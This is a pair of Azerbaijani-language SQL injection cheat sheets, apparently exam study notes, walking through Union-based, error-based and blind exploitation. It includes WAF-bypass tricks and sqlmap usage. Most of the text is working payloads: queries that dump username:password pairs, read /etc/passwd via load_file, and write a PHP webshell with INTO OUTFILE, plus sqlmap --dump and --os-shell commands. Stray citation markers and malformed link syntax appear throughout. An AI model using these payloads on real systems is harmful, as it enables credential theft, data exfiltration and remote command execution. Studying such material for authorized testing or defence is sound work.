---

```markdown
# 🗄️ SQL Injection (SQLi) Eksploytasiya Qeydləri - Hissə 1

Bu sənəd veb tətbiqlərdə SQL İnjection boşluqlarını dərindən analiz etmək, verilənlər bazasının strukturunu xəritələndirmək və manual (əl ilə) Union-Based üsulu ilə həssas məlumatları çıxarmaq üçün hazırlanmışdır.

---

## 📌 1. SQL Injection Hücum Növləri (Xülasə)

SQLi əsasən 3 böyük kateqoriyaya bölünür:
1. **In-Band (İn-line) SQLi:** Hücumçu sorğunun nəticəsini və ya xətanı birbaşa eyni veb səhifədə görür.
   * *Union-Based*
   * *Error-Based*
2. **Inferential (Blind / Kor) SQLi:** Səhifədə birbaşa verilənlər bazası məlumatı görünmür. Cavabın dəyişməsinə (Doğru/Yalan) və ya gecikmə müddətinə əsasən analiz edilir.
   * *Boolean-Based*
   * *Time-Based*
3. **Out-of-Band (OOB) SQLi:** Məlumatlar DNS və ya HTTP protokolları vasitəsilə kənar bir serverə sızdırılır.

---

## 🔍 2. Zəifliyin İlkin Aşkarlanması (Detection)

Səhifədə daxil etmə nöqtələrinə (məsələn: `?id=1`, `?search=test`, giriş panelləri) xüsusi simvollar göndərərək tətbiqin davranışını yoxla:

* **Sındırıcı Simvollar:** `'`, `"`, `\`, `)`, `))`, `;`
* **Nəticənin Analizi:**
  * Əgər səhifədə SQL xətası (`SQL syntax error`) yaranırsa, sistem mütləq zəifdir.
  * Əgər xəta görünmür, lakin səhifənin məzmunu tamamilə itirsə və ya dəyişirsə, bu Kor (Blind) SQLi işarəsidir.

### SQL Şərhləri (Comments)
Sizin daxil etdiyiniz simvoldan sonrakı orijinal SQL kodlarını ləğv etmək üçün istifadə olunan əsas şərh operatorları:
* **MySQL:** `-- -` və ya `#` və ya `/*` (Məsələn: `' OR 1=1-- -`)
* **PostgreSQL:** `--`
* **MSSQL:** `--`

---

## 🚀 3. Union-Based SQLi Manual Eksploytasiya



Əgər tətbiq sorğunun nəticəsini ekranda göstərirsə, verilənlər bazasındakı digər cədvəlləri oxumaq üçün `UNION` operatorundan istifadə edirik. Addım-addım icra ardıcıllığı:

### Addım A: Sütunların Sayının Tapılması (Column Counting)
`UNION SELECT` komandasının işləməsi üçün bizim sorğumuzdakı sütun sayı ilə orijinal sorğunun sütun sayı tam eyni olmalıdır. Bunun üçün `ORDER BY` metodundan istifadə edirik:

```sql
' ORDER BY 1-- -  --> Uğurlu (Səhifə normal yüklənir)
' ORDER BY 2-- -  --> Uğurlu
' ORDER BY 3-- -  --> Uğurlu
' ORDER BY 4-- -  --> XƏTA (Səhifə xəta verir və ya məzmun itir)

```

*Nəticə:* Deməli, orijinal sorğuda **3 sütun** var.

### Addım B: İnleksiya Nöqtəsinin (Reflection Point) Tapılması

Hansı sütunun ekranda göründüyünü və hansı sütunda yazı (String) tipi qəbul edildiyini tapmaq üçün rəqəmləri sıralayırıq.
*Kritik Qeyd:* Orijinal sorğunun nəticəsini gizlətmək üçün əsas ID dəyərini mənfi (`-1`) və ya mövcud olmayan bir dəyər edirik.

```sql
-1' UNION SELECT 1,2,3-- -

```

*Analiz:* Ekranda hansı rəqəm (məsələn, `2` və ya `3`) görünürsə, biz növbəti məlumat çıxarma komandalarımızı məhz həmin rəqəmin yerinə yazacağıq.

### Addım C: Əsas Sistem Məlumatlarının Çıxarılması

Tutaq ki, ekranda `2` rəqəmi əks olunub. İndi verilənlər bazasının adını, versiyasını və istifadəçisini öyrənirik:

```sql
# Verilənlər bazasının adını öyrənmək
-1' UNION SELECT 1,database(),3-- -

# Bazadakı cari istifadəçini öyrənmək
-1' UNION SELECT 1,user(),3-- -

# SQL Versiyasını öyrənmək
-1' UNION SELECT 1,version(),3-- -  (MySQL/PostgreSQL üçün)
-1' UNION SELECT 1,@@version,3-- -  (MSSQL üçün)

-1' UNION SELECT 1, @@basedir, @@datadir, 4-- -  -- Bazanın və məlumat qovluğunun yerini tapmaq üçün [cite: 27]

```

### Addım D: Cədvəl Adlarının Tapılması (Table Enumeration)

MySQL sistemlərində bütün strukturu saxlayan `information_schema`-dan istifadə edərək cari bazadakı cədvəllərin adını çəkirik:

```sql
-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -

```

*Tutaq ki, nəticədə həssas bir cədvəl tapdıq:* `users` və ya `admin_credentials`.

### Addım E: Sütun Adlarının Tapılması (Column Enumeration)

Tapdığımız cədvəlin daxilində hansı sütunların (məsələn: username, password) olduğunu tapırıq:

```sql
-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -

```

*Nəticə:* Sütun adlarının `username` və `password` olduğunu gördük.

### Addım F: Məlumatların Tam Çıxarılması (Data Exfiltration)

Son addım olaraq istifadəçi adlarını və şifrələrini ekrana yazdırırıq. Onları səliqəli görmək üçün aralarına `:` (və ya başqa bir simvol) qoyaraq birləşdiririk (`CONCAT` funksiyası ilə):

```sql
-1' UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -

```

* `group_concat()` -> Bütün sətirləri tək bir sətirdə birləşdirib ekranda göstərir, imtahanda vaxta qənaət edir.


# A. Sistemdən Lokal Faylların Oxunması (LOAD_FILE) [cite: 46]
# Əgər bazanın File_priv icazəsi varsa, serverdəki faylları oxuya bilərik[cite: 47]:
-1' UNION SELECT 1, load_file('/etc/passwd'), 3, 4-- - [cite: 48]

# B. Serverə Fayl Yazmaq və RCE (INTO OUTFILE) [cite: 49, 50]
# Web qovluğunun yolunu biliriksə, birbaşa webshell yarada bilərik[cite: 50]:
-1' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'-- - [cite: 51]

```

---

```markdown
# 🗄️ SQL Injection (SQLi) Eksploytasiya Qeydləri - Hissə 2

Bu sənəd ekranda məlumatın birbaşa görünmədiyi ssenariləri (Error və Blind SQLi), təhlükəsizlik divarlarını (WAF) keçməyi və SQLMap vasitəsilə prosesin tam avtomatlaşdırılmasını əhatə edir.

---

## 💥 1. Error-Based SQLi (Xətaya Əsaslanan SQLi)

Əgər tətbiq verilənlər bazasından gələn normal məlumatları ekranda göstərmirsə, lakin verilənlər bazası xətalarını (`Database Errors`) ekrana yazdırırsa, biz bazanı qəsdən elə bir səhvə məcbur edirik ki, həmin xəta mesajının daxilində bizim istədiyimiz məlumatlar (məsələn, şifrələr) sızsın.

### MySQL üçün Əsas Payload-lar:
Burada `UpdateXML` və ya `ExtractValue` kimi riyazi/XML funksiyalarından istifadə olunur:

```sql
# Verilənlər bazasının adını xəta mesajında görmək
' AND updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
# Gözlənilən xəta: XPATH syntax error: '~cari_baza_adi~'

# İstifadəçi adını və versiyanı çıxarmaq
' AND updatexml(1,concat(0x7e,(select user()),0x7e),1)-- -
' AND extractvalue(1,concat(0x7e,version()))-- -

```

---

## 🙈 2. Blind SQLi (Kor SQLi)

Ekranda nə verilənlər bazası məlumatı, nə də xəta mesajı görünmədikdə **Blind SQLi** üsullarından istifadə olunur. Burada serverə suallar verilir və cavab analiz edilir.

### A. Boolean-Based (Məntiqi Kor SQLi)

Serverin qaytardığı cavabın (səhifənin ölçüsü, mətni və ya status kodu) **Doğru (True)** və ya **Yalan (False)** şərtinə görə dəyişməsini izləyirik. Hərfləri tək-tək tapmaq üçün `SUBSTRING` funksiyasından istifadə olunur.

```sql
# Əgər verilənlər bazasının adının ilk hərfi 'a' dırsa, səhifə normal yüklənəcək:
' AND SUBSTRING(database(),1,1)='a'-- -

# Admin şifrəsinin ilk hərfinin yoxlanılması:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -

```

*İmtahanda Taktika:* Bu proses manual çox vaxt apardığı üçün Burp Intruder-də **Sniper** hücum növü ilə hərfləri avtomatik fuzzer-lə tapmaq lazımdır.

### B. Time-Based (Zamana Əsaslanan Kor SQLi)

Əgər şərt Doğrudursa, verilənlər bazasını müəyyən saniyə gözlədirik (`SLEEP`). Səhifənin gec yüklənməsi şərtin doğru olduğunu sübut edir.

```sql
# MySQL: Əgər şərt doğrudursa 5 saniyə gözlə
' AND IF(1=1, SLEEP(5), 0)-- -

# PostgreSQL:
'; SELECT pg_sleep(5)-- -

# MSSQL (SQL Server):
'; WAITFOR DELAY '0:0:5'-- -

```

---

## 🛡️ 3. Qabaqcıl WAF və Filtr Yan Keçmə Üsulları (Bypass)

İmtahandakı kodlar `SELECT`, `UNION` və ya boşluq simvolunu bloklayırsa, bu bypass fəndlərini tətbiq et:

### A. Boşluq (Space) Filtrini Keçmək

Əgər boşluq buraxmaq qadağandırsa, SQL şərh bloklarından (`//`) boşluq kimi istifadə edin:

* `UNION//SELECT//1,2,3//FROM//users-- -`

### B. Böyük/Kiçik Hərf Manipulyasiyası

Filtr yalnız balaca hərflərlə yazılmış `select` sözünü axtarırsa:

* `1' UnIoN SeLeCt 1,2,3-- -`

### C. İkiqat Yazılış (Double Keywords)

Əgər filtr zərərli sözü tapıb silirsə:

* `1' UNunionION SELselectECT 1,2,3-- -` *(Ortadakı union silindikdə kənardakılar birləşib yenidən UNION yaradır).*

### D. Dırnaq İşarəsi (`'`) Olmadan Yazı (String) Göndərmək

Əgər filtr dırnaq işarələrini tamamilə bloklayırsa, mətni **Hex** formatına çevirib daxil edin (Dırnaqsız):

* Orijinal: `SELECT * FROM users WHERE username='admin'`
* Hex ilə: `SELECT * FROM users WHERE username=0x61646d696e` (`admin` sözünün Hex qarşılığı).

---

## 🤖 4. SQLMap ilə Avtomatlaşdırılmış Eksploytasiya

İmtahanda vaxt daraldıqda və ya manual üsul çətin gəldikdə **SQLMap** ən böyük xilaskardır.

### A. Sürətli Sorğu Tipləri

```bash
# 1. Standart GET sorğusu üzərindən bazaları siyahılamaq
sqlmap -u "[http://target.com/item.php?id=1](http://target.com/item.php?id=1)" --dbs --batch

# 2. Burp Suite-dən tutulmuş sorğu faylı ilə (POST və ya Kökilər/Cookies daxil olduqda ƏN YAXŞISI)
# Sorğunu Burp-dən 'request.txt' olaraq qeyd edin:
sqlmap -r request.txt --dbs --batch

```

### B. Məlumatların Çıxarılması (Data Dumping)

```bash
# Müəyyən bir bazanın daxilindəki cədvəlləri tapmaq
sqlmap -r request.txt -D target_db --tables

# Sütunları tapmaq
sqlmap -r request.txt -D target_db -T users --columns

# Məlumatları tam olaraq ekrana tökmək (Dump)
sqlmap -r request.txt -D target_db -T users --dump

```

### C. Sərt Filtrlərə və WAF-lara Qarşı Gücləndirmə Flags

```bash
# Yoxlama səviyyəsini artırmaq (Daha çox payload yoxlayır)
sqlmap -u "[http://target.com/item.php?id=1](http://target.com/item.php?id=1)" --level=5 --risk=3

# WAF filtrlərini keçmək üçün daxili skriptlərdən (Tamper) istifadə etmək
# space2comment -> Boşluqları /**/ edir, charencode -> URL encode edir
sqlmap -u "[http://target.com/item.php?id=1](http://target.com/item.php?id=1)" --tamper=space2comment,charencode --dbs

```

### D. Sistemdə Əmr İcra Etmək (RCE via SQLi)

Əgər verilənlər bazası istifadəçisi yüksək səlahiyyətlidirsə (məsələn, `root` və ya `sa`), birbaşa serverin terminalını ələ keçirmək olar:

```bash
sqlmap -r request.txt --os-shell

```

```
